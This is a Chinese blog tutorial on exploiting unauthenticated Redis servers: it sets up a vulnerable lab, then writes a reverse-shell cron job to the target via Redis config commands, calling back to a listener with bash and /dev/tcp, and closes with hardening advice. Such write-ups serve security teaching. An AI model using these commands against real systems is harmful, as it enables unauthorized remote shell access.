---
title: Redis未授权访问漏洞利用
date: 2020-05-25 22:48:44
index_img: /img/redis.png
banner_img: /img/redis.png
tags:
  -  安全
categories:
  - 渗透测试
---

#### 漏洞简介及危害
Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器、添加计划任务、写入Webshell等操作。

#### 漏洞利用
##### 环境搭建
```
# redis安装
wget http://download.redis.io/releases/redis-3.2.0.tar.gz
tar -xvzf redis-3.2.0.tar.gz
cd redis-3.2.0
make

# 修改配置文件
vim redis.conf
# bind 127.0.0.1               前面加上#号    
# protected-mode设为no 
protected-mode no
# 保存退出
# 启动redis-server
redis-server redis-conf
```
观察到如下输出，漏洞环境搭建成功
![image](/img/redis_res1.png)

##### 反弹shell
```
# 在攻击主机上打开9999端口监听
[root@]# nc -vv -l -p 9999
```
##### 未授权访问验证
```
# 连接靶机redis
redis -h target_ip

# 获取redis版本等信息
target_ip> info
```
![image](/img/redis_res2.png)
##### 写入shell
```
# 设置变量
target_ip:6379> set xx "\n* * * * * bash -i >& /dev/tcp/attack_ip/9999 0>&1\n"
OK

# 修改redis默认目录和rdb文件
target_ip:6379> config set dir /var/spool/cron
OK
target_ip:6379> config set dbfilename root
OK
target_ip:6379> save
OK
```
##### 成功反弹宿主机shell
![image](/img/redis_res3.png)

> P.S ，测试完记得关闭存在漏洞的redis
#### 修复建议
方法一： 可以修改绑定的IP、端口和指定访问者IP 具体根据实际情况来设定，也可以直接在服务器防火墙上做设置。

方法二： 设置访问密码 在 redis.conf 中找到“requirepass”字段，取消注释并在后面填上你需要的密码。 注：修改redis的配置需要重启redis才能生效。

7 [🔗知乎链接](https://zhuanlan.zhihu.com/p/142798377)
